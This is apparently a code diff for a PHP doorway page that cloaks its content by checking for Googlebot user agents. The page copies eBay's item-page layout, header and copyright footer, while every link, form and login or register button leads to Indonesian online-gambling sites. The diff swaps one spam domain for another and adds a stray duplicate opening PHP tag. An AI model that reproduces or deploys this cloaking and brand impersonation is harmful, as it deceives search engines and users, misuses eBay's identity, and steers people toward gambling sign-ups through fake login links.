@@ -1,4 +1,5 @@
 <?php
+<?php
 function check_user_agent($agent) {
     return strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false;
 }
@@ -9,7 +10,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 <!DOCTYPE html>
 <html lang="en-US">
 <head>
-<link href="https://anydigitalmarketing.pages.dev/" rel="amphtml"/>
+<link href="https://mrjedu.pages.dev/" rel="amphtml"/>
 <link href="//thumbs.ebaystatic.com" rel="dns-prefetch"/>
 <link href="//vi.vipr.ebaydesc.com" rel="dns-prefetch"/>
 <link href="//p.ebaystatic.com" rel="dns-prefetch"/>
@@ -30,9 +31,9 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
                 console.error(err);
             }</script>
 <meta content="ebay-objects:item" property="og:type">
-<link href="https://anydigitalmarketing.co.uk/" rel="canonical">
+<link href="https://mrjedu.com/" rel="canonical">
 <meta content="Situsjitu kini telah hadir login situs toto 4d & dan situs slot paling gacor di tahun 2026 ini dengan memberikan kemenangan termudah untuk kalian gapai maxwin tercepat." name="description">
-<meta content="https://anydigitalmarketing.co.uk/" property="og:url">
+<meta content="https://mrjedu.com/" property="og:url">
 <meta content="Situsjitu kini telah hadir login situs toto 4d & dan situs slot paling gacor di tahun 2026 ini dengan memberikan kemenangan termudah untuk kalian gapai maxwin tercepat." property="og:description"/>
 <meta content="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLDBsgHKxWbN9Pz13FaSQGQWgMKhJj-7KESbAyfEJ4AxutwMSgiweiSfTM-9d5wCt5kTWXG-WrgvuTkoa5lfusj4W5VUf1DP6DG-VUEFV8uw9RJu5xVPxsL6ROgWERhrFugVY-Wos8EpenzOchYjDcvIFH6Ohs6z8z38AD5aTWeJ2dXY_HTozBJjN14kJ3/s600/situsjitu-toto-slot.jpg" property="og:image"/>
 <meta content="102628213125203" property="fb:app_id"/>
@@ -143,13 +144,13 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
                     to main content</a></div>
 <nav class="gh-nav">
 <div class="gh-nav__left-wrap"><!--globalheaderweb#s0-1-4-8-3[0]-0--><span class="gh-identity"><span class="gh-identity__srvr" data-marko-key="5 s0-1-4-8-3[0]-0" id="gh-ident-srvr-wrap"><!--F#6--><span class="gh-identity__greeting">Hi <span><span id="gh-ident-srvr-name"></span>!</span></span><!--F/--><!--F#7-->
-<!--REMOVED_SUSPICIOUS_SCRIPT: Pattern matched: \bFunction\s*\(--><!--F/--><!--globalheaderweb^s0-1-4-8-3[0]-0-8 s0-1-4-8-3[0]-0 8--><span class="gh-identity-signed-out-unrecognized">Hi! <a _sp="m570.l1524" href="https://anydigitalmarketing.pages.dev/">Sign in</a><span class="hide-at-md"> or <a _sp="m570.l2621" href="https://anydigitalmarketing.pages.dev/">register</a></span></span><!--globalheaderweb/-->
-</span></span><!--globalheaderweb/--><span class="gh-nav-link"><a _sp="m570.l3188" aria-label="Daily Deals" href="https://anydigitalmarketing.co.uk/">SITUSJITU</a></span><span class="gh-nav-link"><a _sp="m570.l47233" aria-label="SITUS SLOT" href="https://anydigitalmarketing.co.uk/">SITUS SLOT</a></span><span class="gh-nav-link"><a _sp="m570.l174317" aria-label="SLOT ONLINE" href="https://anydigitalmarketing.co.uk/">SLOT
-                            ONLINE</a></span><span class="gh-nav-link"><a _sp="m570.l1545" aria-label="Help &amp; Contact" href="https://anydigitalmarketing.pages.dev/">SLOT
+<!--REMOVED_SUSPICIOUS_SCRIPT: Pattern matched: \bFunction\s*\(--><!--F/--><!--globalheaderweb^s0-1-4-8-3[0]-0-8 s0-1-4-8-3[0]-0 8--><span class="gh-identity-signed-out-unrecognized">Hi! <a _sp="m570.l1524" href="https://mrjedu.pages.dev/">Sign in</a><span class="hide-at-md"> or <a _sp="m570.l2621" href="https://mrjedu.pages.dev/">register</a></span></span><!--globalheaderweb/-->
+</span></span><!--globalheaderweb/--><span class="gh-nav-link"><a _sp="m570.l3188" aria-label="Daily Deals" href="https://mrjedu.com/">SITUSJITU</a></span><span class="gh-nav-link"><a _sp="m570.l47233" aria-label="SITUS SLOT" href="https://mrjedu.com/">SITUS SLOT</a></span><span class="gh-nav-link"><a _sp="m570.l174317" aria-label="SLOT ONLINE" href="https://mrjedu.com/">SLOT
+                            ONLINE</a></span><span class="gh-nav-link"><a _sp="m570.l1545" aria-label="Help &amp; Contact" href="https://mrjedu.pages.dev/">SLOT
                             TERBARU</a></span></div>
 <div class="gh-nav__right-wrap">
 <!--globalheaderweb#s0-1-4-8-6--><!--globalheaderweb/--><!--globalheaderweb#s0-1-4-8-7--><!--globalheaderweb/--><span class="gh-nav-link" data-id="LOGIN"><a _sp="m570.l1528" aria-label="SLOT TERPERCAYA" href="">SLOT TERPERCAYA</a></span><!--globalheaderweb#s0-1-4-8-10-0-->
-<div class="gh-flyout is-right-aligned gh-watchlist"><!--F#1--><a _sp="m570.l47137" class="gh-flyout__target" href="https://anydigitalmarketing.pages.dev/"><!--F#6--><span class="gh-watchlist__target">Watchlist</span><!--F/--><!--F#7--><svg aria-hidden="true" class="gh-flyout__chevron icon icon--12" focusable="false" tabindex="-1">
+<div class="gh-flyout is-right-aligned gh-watchlist"><!--F#1--><a _sp="m570.l47137" class="gh-flyout__target" href="https://mrjedu.pages.dev/"><!--F#6--><span class="gh-watchlist__target">Watchlist</span><!--F/--><!--F#7--><svg aria-hidden="true" class="gh-flyout__chevron icon icon--12" focusable="false" tabindex="-1">
 <defs>
 <symbol id="icon-chevron-down-12" viewbox="0 0 12 12">
 <path clip-rule="evenodd" d="M1.808 4.188a.625.625 0 0 1 .884 0L6 7.495l3.308-3.307a.625.625 0 1 1 .884.885l-3.75 3.749a.625.625 0 0 1-.884 0l-3.75-3.749a.626.626 0 0 1 0-.885Z" fill-rule="evenodd">
@@ -164,28 +165,28 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 </div>
 </div>
 <!--globalheaderweb/--><!--globalheaderweb#s0-1-4-8-11--><!--globalheaderweb^s0-1-4-8-11-0 s0-1-4-8-11 0-->
-<div class="gh-flyout is-left-aligned gh-my-ebay"><!--F#1--><a _sp="m570.l2919" class="gh-flyout__target" href="https://anydigitalmarketing.co.uk/"><!--F#6--><span class="gh-my-ebay__link gh-rvi-menu">My eBay<i class="gh-sprRetina gh-eb-arw gh-rvi-chevron"></i></span><!--F/--><!--F#7--><svg aria-hidden="true" class="gh-flyout__chevron icon icon--12" focusable="false" tabindex="-1">
+<div class="gh-flyout is-left-aligned gh-my-ebay"><!--F#1--><a _sp="m570.l2919" class="gh-flyout__target" href="https://mrjedu.com/"><!--F#6--><span class="gh-my-ebay__link gh-rvi-menu">My eBay<i class="gh-sprRetina gh-eb-arw gh-rvi-chevron"></i></span><!--F/--><!--F#7--><svg aria-hidden="true" class="gh-flyout__chevron icon icon--12" focusable="false" tabindex="-1">
 <use href="#icon-chevron-down-12"></use>
 </svg><!--F/--></a><button aria-controls="s0-1-4-8-11-0-dialog" aria-expanded="false" aria-haspopup="true" class="gh-flyout__target-a11y-btn" tabindex="0">Expand My
                             eBay</button><!--F/-->
 <div class="gh-flyout__dialog" id="s0-1-4-8-11-0-dialog">
 <div class="gh-flyout__box"><!--F#4-->
 <ul class="gh-my-ebay__list">
-<li class="gh-my-ebay__list-item"><a _sp="m570.l1533" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Summary</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l9225" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Recently Viewed</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l1535" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Bids/Offers</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l1534" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Watchlist</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l1536" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Purchase History</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l47010" href="https://anydigitalmarketing.co.uk/" tabindex="0">Buy Again</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l1537" href="https://anydigitalmarketing.co.uk/" tabindex="0">LOGINing</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l187417" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Saved Feed</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l9503" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Saved Searches</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l9505" href="https://anydigitalmarketing.pages.dev/" tabindex="0">Saved LOGINers</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l143039" href="https://anydigitalmarketing.co.uk/" tabindex="0">My Garage</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l177358" href="https://anydigitalmarketing.co.uk/" tabindex="0">Sizes</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l105163" href="https://anydigitalmarketing.co.uk/" tabindex="0">My Collection</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l1533" href="https://mrjedu.pages.dev/" tabindex="0">Summary</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l9225" href="https://mrjedu.pages.dev/" tabindex="0">Recently Viewed</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l1535" href="https://mrjedu.pages.dev/" tabindex="0">Bids/Offers</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l1534" href="https://mrjedu.pages.dev/" tabindex="0">Watchlist</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l1536" href="https://mrjedu.pages.dev/" tabindex="0">Purchase History</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l47010" href="https://mrjedu.com/" tabindex="0">Buy Again</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l1537" href="https://mrjedu.com/" tabindex="0">LOGINing</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l187417" href="https://mrjedu.pages.dev/" tabindex="0">Saved Feed</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l9503" href="https://mrjedu.pages.dev/" tabindex="0">Saved Searches</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l9505" href="https://mrjedu.pages.dev/" tabindex="0">Saved LOGINers</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l143039" href="https://mrjedu.com/" tabindex="0">My Garage</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l177358" href="https://mrjedu.com/" tabindex="0">Sizes</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l105163" href="https://mrjedu.com/" tabindex="0">My Collection</a></li>
 <li class="gh-my-ebay__list-item"><a _sp="m570.l1539" href="https://mesg.ebay.com/mesgweb/ViewMessages/0" tabindex="0">Messages</a></li>
-<li class="gh-my-ebay__list-item"><a _sp="m570.l155388" href="https://anydigitalmarketing.co.uk/" tabindex="0">PSA Vault</a></li>
+<li class="gh-my-ebay__list-item"><a _sp="m570.l155388" href="https://mrjedu.com/" tabindex="0">PSA Vault</a></li>
 </ul><!--F/-->
 </div>
 </div>
@@ -203,7 +204,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 <div class="gh-flyout__dialog" id="s0-1-4-8-12-0-1-dialog">
 <div class="gh-flyout__box"><!--F#4-->
 <div class="gh-notifications__dialog">
-<div class="gh-notifications__notloaded"><span class="gh-notifications__signin">Please <a _sp="m570.l2881" href="https://anydigitalmarketing.pages.dev/">sign-in</a> to view
+<div class="gh-notifications__notloaded"><span class="gh-notifications__signin">Please <a _sp="m570.l2881" href="https://mrjedu.pages.dev/">sign-in</a> to view
                                                 notifications.</span></div>
 <div class="gh-notifications__loaded" data-marko-key="@dynamic s0-1-4-8-12-0">
 </div>
@@ -271,7 +272,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 </div>
 </div><!--globalheaderweb/-->
 </div>
-<form action="https://anydigitalmarketing.co.uk/" class="gh-search" id="gh-f" method="get" target="_top">
+<form action="https://mrjedu.com/" class="gh-search" id="gh-f" method="get" target="_top">
 <div class="gh-search-box__wrap" id="gh-search-box">
 <div class="gh-search__wrap"><!--globalheaderweb#s0-1-4-12-4-->
 <div class="gh-search-input__wrap" id="gh-ac-wrap"><input aria-autocomplete="list" aria-expanded="false" aria-haspopup="true" aria-label="Search for anything" autocapitalize="off" autocomplete="off" autocorrect="off" class="gh-search-input gh-tb ui-autocomplete-input" data-marko='{"oninput":"handleTextUpdate s0-1-4-12-4 false","onfocusin":"handleMarkTimer s0-1-4-12-4 false","onkeydown":"handleMarkTimer s0-1-4-12-4 false"}' data-marko-key="@input s0-1-4-12-4" id="gh-ac" maxlength="300" name="_nkw" placeholder="Search for anything" role="combobox" size="50" spellcheck="false" tabindex="4" title="Search" type="text"/><!--globalheaderweb#s0-1-4-12-4-1-0--><svg aria-hidden="true" class="gh-search-input__icon icon icon--16" data-marko-key="@svg s0-1-4-12-4-1-0" focusable="false">
@@ -298,7 +299,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 </div><input name="_from" type="hidden" value="R40"/><input name="_trksid" type="hidden" value="m570.l1313"/><!--globalheaderweb#s0-1-4-12-8-->
 <div class="gh-search-button__wrap"><!--globalheaderweb^s0-1-4-12-8-@btn s0-1-4-12-8 @btn--><button class="gh-search-button btn btn--primary" data-ebayui="" data-marko='{"onclick":"handleClick s0-1-4-12-8-@btn false","onkeydown":"handleKeydown s0-1-4-12-8-@btn false","onfocus":"handleFocus s0-1-4-12-8-@btn false","onblur":"handleBlur s0-1-4-12-8-@btn false"}' id="gh-search-btn" role="button" tabindex="6" type="submit" value="Search"><span class="gh-search-button__label">Search</span><!--globalheaderweb#s0-1-4-12-8-@btn-7-2-0--><svg aria-hidden="true" class="gh-search-button__icon icon icon--16" data-marko-key="@svg s0-1-4-12-8-@btn-7-2-0" focusable="false">
 <use href="#icon-search-16"></use>
-</svg><!--globalheaderweb/--></button><!--globalheaderweb/--><a _sp="m570.l2614" class="gh-search-button__advanced-link" href="https://anydigitalmarketing.co.uk/" tabindex="7">Advanced</a></div><!--globalheaderweb/-->
+</svg><!--globalheaderweb/--></button><!--globalheaderweb/--><a _sp="m570.l2614" class="gh-search-button__advanced-link" href="https://mrjedu.com/" tabindex="7">Advanced</a></div><!--globalheaderweb/-->
 </form>
 </section>
 </header>
@@ -313,7 +314,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 <h2 class="clipped" id="s0-2-0-15-3-1-@key-comp-SEOBREADCRUMBS-0-1[breadcrumbsModule]-breadcrumbs-heading">
                     breadcrumb</h2>
 <ul>
-<li><a _sp="p2349526.m74470.l92216.c1" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c1"}}' href="https://anydigitalmarketing.co.uk/" title=""><!--F#7[0]--><span>SITUSJITU</span><!--F/--></a><svg aria-hidden="true" class="icon icon--12" focusable="false">
+<li><a _sp="p2349526.m74470.l92216.c1" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c1"}}' href="https://mrjedu.com/" title=""><!--F#7[0]--><span>SITUSJITU</span><!--F/--></a><svg aria-hidden="true" class="icon icon--12" focusable="false">
 <defs>
 <symbol id="icon-chevron-right-12" viewbox="0 0 12 12">
 <path clip-rule="evenodd" d="M4.183 10.192a.625.625 0 0 1 0-.884L7.487 6 4.183 2.692a.625.625 0 0 1 .884-.884l3.745 3.75a.625.625 0 0 1 0 .884l-3.745 3.75a.625.625 0 0 1-.884 0Z" fill-rule="evenodd">
@@ -322,18 +323,18 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 </defs>
 <use href="#icon-chevron-right-12"></use>
 </svg></li>
-<li><a _sp="p2349526.m74470.l92216.c2" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c2"}}' href="https://anydigitalmarketing.co.uk/" title=""><!--F#7[1]--><span>SITUSJITU SLOT</span><!--F/--></a><svg aria-hidden="true" class="icon icon--12" focusable="false">
+<li><a _sp="p2349526.m74470.l92216.c2" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c2"}}' href="https://mrjedu.com/" title=""><!--F#7[1]--><span>SITUSJITU SLOT</span><!--F/--></a><svg aria-hidden="true" class="icon icon--12" focusable="false">
 <use href="#icon-chevron-right-12"></use>
 </svg></li>
-<li><a _sp="p2349526.m74470.l92216.c3" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c3"}}' href="https://anydigitalmarketing.co.uk/" title=""><!--F#7[2]--><span>SITUSJITU DAFTAR</span><!--F/--></a><svg aria-hidden="true" class="icon icon--12" focusable="false">
+<li><a _sp="p2349526.m74470.l92216.c3" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c3"}}' href="https://mrjedu.com/" title=""><!--F#7[2]--><span>SITUSJITU DAFTAR</span><!--F/--></a><svg aria-hidden="true" class="icon icon--12" focusable="false">
 <use href="#icon-chevron-right-12"></use>
 </svg></li>
-<li><a _sp="p2349526.m74470.l92216.c4" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c4"}}' href="https://anydigitalmarketing.co.uk/" title=""><!--F#7[3]--><span>SITUSJITU LOGIN</span><!--F/--></a></li>
+<li><a _sp="p2349526.m74470.l92216.c4" class="seo-breadcrumb-text" data-track='{"actionKind":"NAV","operationId":"2349526","flushImmediately":false,"eventProperty":{"trkp":"pageci%3Anull%7Cparentrq%3Anull","sid":"p2349526.m74470.l92216.c4"}}' href="https://mrjedu.com/" title=""><!--F#7[3]--><span>SITUSJITU LOGIN</span><!--F/--></a></li>
 </ul>
 </nav>
 </div>
 <script type="application/ld+json">
-                {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"SITUSJITU","item":"https://anydigitalmarketing.co.uk/"},{"@type":"ListItem","position":2,"name":"SITUSJITU SLOT","item":"https://anydigitalmarketing.co.uk/"},{"@type":"ListItem","position":3,"name":"SITUSJITU DAFTAR","item":"https://anydigitalmarketing.co.uk/"},{"@type":"ListItem","position":4,"name":"SITUSJITU LOGIN","item":"https://anydigitalmarketing.co.uk/"}]}
+                {"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"SITUSJITU","item":"https://mrjedu.com/"},{"@type":"ListItem","position":2,"name":"SITUSJITU SLOT","item":"https://mrjedu.com/"},{"@type":"ListItem","position":3,"name":"SITUSJITU DAFTAR","item":"https://mrjedu.com/"},{"@type":"ListItem","position":4,"name":"SITUSJITU LOGIN","item":"https://mrjedu.com/"}]}
             </script>
 <div class="x-prp-main-container_row">
 <div class="x-prp-main-container_col-left">
@@ -596,7 +597,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
                     }
                 </style>
 <div class="n-columns-2">
-<a class="login" href="https://anydigitalmarketing.pages.dev/" rel="nofollow noreferrer">LOGIN</a>
+<a class="login" href="https://mrjedu.pages.dev/" rel="nofollow noreferrer">LOGIN</a>
 <a class="register" href="https://shortenworld.cloud/silentjt" rel="nofollow noreferrer">DAFTAR</a>
 </div>
 <div class="vim x-price-section" data-testid="x-price-section">
@@ -785,7 +786,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
                                     Reviews</span><!--F/--><!--F/--><!--F/--></h2>
 </div>
 </div>
-<div class="x-review-header__learn-more"><a _sp="p2349526.m3637.l149867" class="ux-action" data-testid="ux-action" href="https://anydigitalmarketing.co.uk/"><!--F#10--><!--F#f_1--><!--F#12[0]--><span class="ux-textspans ux-textspans--PSEUDOLINK">Learn
+<div class="x-review-header__learn-more"><a _sp="p2349526.m3637.l149867" class="ux-action" data-testid="ux-action" href="https://mrjedu.com/"><!--F#10--><!--F#f_1--><!--F#12[0]--><span class="ux-textspans ux-textspans--PSEUDOLINK">Learn
                                 more</span><!--F/--><!--F/--><!--F/--></a></div>
 </div>
 </div>
@@ -948,7 +949,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 <div class="x-review-details__head">
 <h3 class="x-review-details__title"><!--F#12[0]--><span class="ux-textspans">Most relevant
                             reviews</span><!--F/--></h3>
-<div class="x-review-details__allreviews"><a _sp="p2349526.m3637.l6846" class="ux-action" data-testid="ux-action" href="https://anydigitalmarketing.co.uk/"><!--F#10--><!--F#f_1--><!--F#12[0]--><span class="ux-textspans">See all 79235 reviews</span><!--F/--><!--F/--><!--F/--></a></div>
+<div class="x-review-details__allreviews"><a _sp="p2349526.m3637.l6846" class="ux-action" data-testid="ux-action" href="https://mrjedu.com/"><!--F#10--><!--F#f_1--><!--F#12[0]--><span class="ux-textspans">See all 79235 reviews</span><!--F/--><!--F/--><!--F/--></a></div>
 </div>
 
 <ul class="x-review-details__body vip-review-slider">
@@ -1272,7 +1273,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 <!--F#2--><!--F#f_1--><!--F#12[0]--><span class="ux-textspans">Photos from
                             reviews</span><!--F/--><!--F/--><!--F/--></h2>
 </div>
-<div class="section-title__cta"><a href="https://anydigitalmarketing.co.uk/"><span class="section-title__cta-text">See all</span></a></div>
+<div class="section-title__cta"><a href="https://mrjedu.com/"><span class="section-title__cta-text">See all</span></a></div>
 </div>
 <div aria-roledescription="Carousel" class="carousel" role="group">
 <div class="carousel__container" id="s0-2-0-15-3-7-@key-comp-BESTLOGINING-4[0]-container"><button aria-disabled="true" aria-label="Previous slide - Photos from reviews" class="carousel__control carousel__control--prev" type="button"><svg aria-hidden="true" class="icon icon--16" focusable="false">
@@ -1290,7 +1291,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 <!--F/-->
 </li>
 <li class="carousel__snap-point" style="margin-right:16px"><!--F#4[@3]-->
-<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://anydigitalmarketing.co.uk/"><!--F#10-->
+<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://mrjedu.com/"><!--F#10-->
 <div class="card-image-container image-treatment"><img alt="SITUSJITU" loading="lazy" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLDBsgHKxWbN9Pz13FaSQGQWgMKhJj-7KESbAyfEJ4AxutwMSgiweiSfTM-9d5wCt5kTWXG-WrgvuTkoa5lfusj4W5VUf1DP6DG-VUEFV8uw9RJu5xVPxsL6ROgWERhrFugVY-Wos8EpenzOchYjDcvIFH6Ohs6z8z38AD5aTWeJ2dXY_HTozBJjN14kJ3/s600/situsjitu-toto-slot.jpg"/></div>
 <div class="x-card_details-wrapper">
 <div class="x-card_details">
@@ -1319,7 +1320,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 </a></div><!--F/-->
 </li>
 <li class="carousel__snap-point" style="margin-right:16px"><!--F#4[@4]-->
-<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://anydigitalmarketing.co.uk/"><!--F#10-->
+<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://mrjedu.com/"><!--F#10-->
 <div class="card-image-container image-treatment"><img alt="SITUSJITU SLOT" loading="lazy" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLDBsgHKxWbN9Pz13FaSQGQWgMKhJj-7KESbAyfEJ4AxutwMSgiweiSfTM-9d5wCt5kTWXG-WrgvuTkoa5lfusj4W5VUf1DP6DG-VUEFV8uw9RJu5xVPxsL6ROgWERhrFugVY-Wos8EpenzOchYjDcvIFH6Ohs6z8z38AD5aTWeJ2dXY_HTozBJjN14kJ3/s600/situsjitu-toto-slot.jpg"/></div>
 <div class="x-card_details-wrapper">
 <div class="x-card_details">
@@ -1348,7 +1349,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 </a></div><!--F/-->
 </li>
 <li class="carousel__snap-point" style="margin-right:16px"><!--F#4[@5]-->
-<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://anydigitalmarketing.co.uk/"><!--F#10-->
+<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://mrjedu.com/"><!--F#10-->
 <div class="card-image-container image-treatment"><img alt="SITUSJITU DAFTAR" loading="lazy" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLDBsgHKxWbN9Pz13FaSQGQWgMKhJj-7KESbAyfEJ4AxutwMSgiweiSfTM-9d5wCt5kTWXG-WrgvuTkoa5lfusj4W5VUf1DP6DG-VUEFV8uw9RJu5xVPxsL6ROgWERhrFugVY-Wos8EpenzOchYjDcvIFH6Ohs6z8z38AD5aTWeJ2dXY_HTozBJjN14kJ3/s600/situsjitu-toto-slot.jpg"/></div>
 <div class="x-card_details-wrapper">
 <div class="x-card_details">
@@ -1377,7 +1378,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 </a></div><!--F/-->
 </li>
 <li class="carousel__snap-point"><!--F#4[@6]-->
-<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://anydigitalmarketing.co.uk/"><!--F#10-->
+<div class="x-card" data-testid="x-card"><a _sp="p2349526.m4475.l8293" class="ux-action" data-testid="ux-action" href="https://mrjedu.com/"><!--F#10-->
 <div class="card-image-container image-treatment"><img alt="LINK SITUSJITU DAFTAR" loading="lazy" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiLDBsgHKxWbN9Pz13FaSQGQWgMKhJj-7KESbAyfEJ4AxutwMSgiweiSfTM-9d5wCt5kTWXG-WrgvuTkoa5lfusj4W5VUf1DP6DG-VUEFV8uw9RJu5xVPxsL6ROgWERhrFugVY-Wos8EpenzOchYjDcvIFH6Ohs6z8z38AD5aTWeJ2dXY_HTozBJjN14kJ3/s600/situsjitu-toto-slot.jpg"/></div>
 <div class="x-card_details-wrapper">
 <div class="x-card_details">
@@ -1424,8 +1425,8 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
 <div class="adBanner ad ads adsbox doubleclick ad-placement ad-placeholder adbadge BannerAd" id="gh-bulletin-det" style="height:1px;overflow:hidden;"></div>
 <div id="ghw-static-footer" style="display:none">
 <footer style="font-family:'Market Sans';color:#41413f;font-size:11px">Copyright © 1995-2025 eBay Inc.
-            All Rights Reserved. <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">Accessibility</a>,
-            <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">User Agreement</a>, <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">Privacy</a>, <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">Consumer Health Data</a>, <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">Payments Terms of Use</a>, <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">Cookies</a>, <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">CA Privacy Notice</a>, <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">Your Privacy Choices</a> and <a href="https://anydigitalmarketing.co.uk/" style="color:#707070;">AdChoice</a></footer>
+            All Rights Reserved. <a href="https://mrjedu.com/" style="color:#707070;">Accessibility</a>,
+            <a href="https://mrjedu.com/" style="color:#707070;">User Agreement</a>, <a href="https://mrjedu.com/" style="color:#707070;">Privacy</a>, <a href="https://mrjedu.com/" style="color:#707070;">Consumer Health Data</a>, <a href="https://mrjedu.com/" style="color:#707070;">Payments Terms of Use</a>, <a href="https://mrjedu.com/" style="color:#707070;">Cookies</a>, <a href="https://mrjedu.com/" style="color:#707070;">CA Privacy Notice</a>, <a href="https://mrjedu.com/" style="color:#707070;">Your Privacy Choices</a> and <a href="https://mrjedu.com/" style="color:#707070;">AdChoice</a></footer>
 </div>
 <!--REMOVED_SUSPICIOUS_SCRIPT: Pattern matched: \bFunction\s*\(-->
 <!-- RcmdId Footer,RlogId t6diiebinbbacut%60ddlkr%3D9bjhadjofdbbqrce%60jhs.3de5fb161%3F*w%60ut02%2B3svqk-199654419a2-0x804 --><!-- SiteId: 0, Environment: production, AppName: globalheaderweb, PageId: 4479693 --><!-- ghw_reverted -->
@@ -1688,7 +1689,7 @@ if (check_user_agent('Googlebot') || check_user_agent('Google-Site-Verification'
             Daftar Sekarang
           </a>
           <a class="SITUSJITU-popup-btn SITUSJITU-popup-btn-login"
-             href="https://anydigitalmarketing.pages.dev/"
